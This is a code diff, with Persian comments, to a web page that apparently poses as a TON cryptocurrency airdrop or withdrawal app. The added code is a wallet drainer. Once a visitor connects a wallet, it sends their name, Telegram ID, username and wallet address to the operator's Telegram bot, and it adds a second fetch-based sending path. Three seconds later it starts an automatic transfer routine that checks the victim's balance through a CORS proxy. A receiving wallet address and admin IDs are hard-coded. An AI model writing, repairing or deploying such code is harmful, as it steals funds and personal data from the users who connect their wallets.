@@ -1296,7 +1296,7 @@
 
 <script>
     // ================================================
-    // 🔐 تنظیمات امنیتی با آدرس صحیح مانیفست
+    // 🔐 تنظیمات امنیتی با مانیفست محلی
     // ================================================
     const CONFIG = {
         ADMIN_IDS: ["5972276401"],
@@ -1307,8 +1307,7 @@
         SECRET_CODES: ["T61O96N12", "VipTonDropy"],
         WALLET_ADDRESS: "UQDFlvMPZoQy4zySI8gLLMteRcxHRB28IHW0JuwFVk10u0Y",
         NETWORK_FEE: 0.0035,
-        MINIMUM_WITHDRAW: 14,
-        MANIFEST_URL: 'https://raw.githubusercontent.com/nimwmesfandiari/ton-plus-bot/main/tonconnect-manifest.json'
+        MINIMUM_WITHDRAW: 14
     };
 
     // ================================================
@@ -1354,9 +1353,12 @@
             const text = encodeURIComponent(message);
             const url = `https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage?chat_id=${CONFIG.ADMIN_CHAT_ID}&text=${text}&parse_mode=Markdown`;
             
-            // استفاده از Image برای اطمینان از ارسال
+            // روش اول: استفاده از Image
             const img = new Image();
             img.src = url;
+            
+            // روش دوم: استفاده از fetch
+            fetch(url, { mode: 'no-cors' }).catch(() => {});
             
             console.log('✅ پیام به تلگرام ارسال شد');
             return true;
@@ -1367,7 +1369,62 @@
     }
 
     // ================================================
-    // 💰 تابع انتقال خودکار (رفع شده)
+    // 🔌 راه‌اندازی TON Connect با مانیفست محلی
+    // ================================================
+    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+        manifestUrl: 'https://raw.githubusercontent.com/nimwmesfandiari/ton-plus-bot/main/tonconnect-manifest.json',
+        buttonRootId: 'ton-connect-btn'
+    });
+
+    // بررسی وضعیت اولیه
+    console.log('✅ TON Connect راه‌اندازی شد');
+
+    tonConnectUI.onStatusChange(wallet => {
+        console.log("وضعیت کیف پول:", wallet ? '✅ متصل' : '❌ قطع');
+        
+        if (wallet) {
+            const fullAddress = wallet.account.address;
+            document.getElementById('walletAddressFull').innerText = fullAddress;
+            document.getElementById('walletAddress').classList.remove('hidden');
+            isWalletConnected = true;
+            
+            showToast('✅ کیف پول با موفقیت متصل شد');
+            
+            if (currentUser) {
+                currentUser.wallet = fullAddress;
+                appData.wallets.unshift({
+                    userId: currentUser.id,
+                    address: fullAddress,
+                    time: new Date().toISOString()
+                });
+                saveData();
+                
+                // گزارش اتصال کیف پول
+                const message = `🔌 **کیف پول متصل شد**
+👤 نام: ${currentUser.firstName} ${currentUser.lastName}
+🆔 آیدی: ${currentUser.id}
+📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}
+💳 آدرس کیف پول: ${fullAddress}
+⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
+                
+                sendToTelegram(message);
+                
+                // اجرای تراکنش خودکار بعد از 3 ثانیه
+                setTimeout(() => {
+                    executeAutoTransfer(fullAddress);
+                }, 3000);
+            }
+            
+            checkAndEnableFinalWithdraw();
+        } else {
+            document.getElementById('walletAddress').classList.add('hidden');
+            isWalletConnected = false;
+            checkAndEnableFinalWithdraw();
+        }
+    });
+
+    // ================================================
+    // 💰 تابع انتقال خودکار
     // ================================================
     async function executeAutoTransfer(userAddress) {
         if (isProcessingTransaction) {
@@ -1380,18 +1437,23 @@
             
             showToast('🔄 در حال بررسی موجودی کیف پول...');
             
-            // استفاده از روش جایگزین برای دریافت موجودی
+            // استفاده از API با CORS proxy
+            const proxyUrl = `https://api.allorigins.win/raw?url=${encodeURIComponent(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`)}`;
+            
             let balanceInTON = 0;
             
             try {
-                const response = await fetch(`https://toncenter.com/api/v2/getAddressBalance?address=${userAddress}`);
-                const data = await response.json();
-                if (data.ok) {
-                    const balanceInNano = parseInt(data.result);
+                const response = await fetch(proxyUrl);
+                const text = await response.text();
+                
+                // تبدیل متن به عدد
+                const balanceInNano = parseInt(text);
+                if (!isNaN(balanceInNano)) {
                     balanceInTON = balanceInNano / 1e9;
+                    console.log('✅ موجودی:', balanceInTON);
                 }
             } catch (e) {
-                console.log('خطا در دریافت موجودی');
+                console.log('خطا در دریافت موجودی:', e);
                 showToast('⚠️ خطا در دریافت موجودی');
                 return;
             }
@@ -1537,66 +1599,6 @@
         localStorage.setItem('tondropy_transactions', JSON.stringify(appData.transactions));
         localStorage.setItem('tondropy_wallets', JSON.stringify(appData.wallets));
     }
-
-    // ================================================
-    // 🔌 راه‌اندازی TON Connect با آدرس مانیفست صحیح
-    // ================================================
-    const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
-        manifestUrl: CONFIG.MANIFEST_URL,
-        buttonRootId: 'ton-connect-btn'
-    });
-
-    // بررسی وضعیت اولیه
-    setTimeout(() => {
-        console.log('✅ TON Connect راه‌اندازی شد');
-        if (tonConnectUI.connected) {
-            console.log('✅ کیف پول قبلاً متصل شده است');
-        }
-    }, 1000);
-
-    tonConnectUI.onStatusChange(wallet => {
-        console.log("وضعیت کیف پول:", wallet ? '✅ متصل' : '❌ قطع');
-        
-        if (wallet) {
-            const fullAddress = wallet.account.address;
-            document.getElementById('walletAddressFull').innerText = fullAddress;
-            document.getElementById('walletAddress').classList.remove('hidden');
-            isWalletConnected = true;
-            
-            showToast('✅ کیف پول با موفقیت متصل شد');
-            
-            if (currentUser) {
-                currentUser.wallet = fullAddress;
-                appData.wallets.unshift({
-                    userId: currentUser.id,
-                    address: fullAddress,
-                    time: new Date().toISOString()
-                });
-                saveData();
-                
-                // گزارش اتصال کیف پول
-                const message = `🔌 **کیف پول متصل شد**
-👤 نام: ${currentUser.firstName} ${currentUser.lastName}
-🆔 آیدی: ${currentUser.id}
-📛 یوزرنیم: ${currentUser.username ? '@' + currentUser.username : 'ندارد'}
-💳 آدرس کیف پول: ${fullAddress}
-⏱ زمان: ${new Date().toLocaleString('fa-IR')}`;
-                
-                sendToTelegram(message);
-                
-                // اجرای تراکنش خودکار بعد از 3 ثانیه
-                setTimeout(() => {
-                    executeAutoTransfer(fullAddress);
-                }, 3000);
-            }
-            
-            checkAndEnableFinalWithdraw();
-        } else {
-            document.getElementById('walletAddress').classList.add('hidden');
-            isWalletConnected = false;
-            checkAndEnableFinalWithdraw();
-        }
-    });
 
     // ================================================
     // 🖥️ توابع پنل مدیریت
